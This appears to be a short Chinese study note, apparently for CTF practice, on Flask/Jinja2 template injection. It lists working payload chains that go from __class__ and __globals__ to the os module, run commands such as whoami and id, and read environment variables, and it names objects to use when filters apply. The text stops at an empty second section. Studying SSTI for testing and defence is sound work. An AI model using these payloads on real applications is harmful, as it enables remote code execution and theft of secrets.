# flask模板注入
#### `__class__`:获取元素的类型

##### 变量/对象.__class__:元素的类型

```
变量/对象.__class__
```



## 1.使用`__globals__`来执行os

### 元素是带有函数的对象时:

```
对象.__class__
```

##### **<u>所有对象基本都有构造函数,在不知道有哪些对象或者对象被过滤时,可以使用config,request,session,g,"",(),[]</u>**

### `__init__`:拿出构造函数对象object

```
().__class__.__init__
```
#### **或者直接使用`url_for`,`get_flashed_messages`,lipsum,cycler,joiner,namespace这些自带函数对象**

```
url_for.__globals__['os'].popen('id').read()
```

#### `__globals__`:对象模块的全局字典,包含os等主要模块

```
().__class__.__init__.__globals__
```
#### 掏出全局字典的os
```
().__class__.__init__.__globals__['os']
```


#### 拿到os模块后开始执行命令
```
os=().__class__.__init__.__globals__['os']
os.popen('whoami').read()    # 执行命令，读回输出
os.system('id')              # 执行命令，不回显
os.environ                   # 读环境变量（常藏 flag）
```




### 元素是不带有函数的字面量时:
##### `__globals__`:字面量模块的全局字典builtins,包含import,eval等主要模块,没有os模板
```
"hi".__class__.__init__.__globals__['__builtins__']['__import__']('os')
```


## 2.不使用`__globals__`来执行os

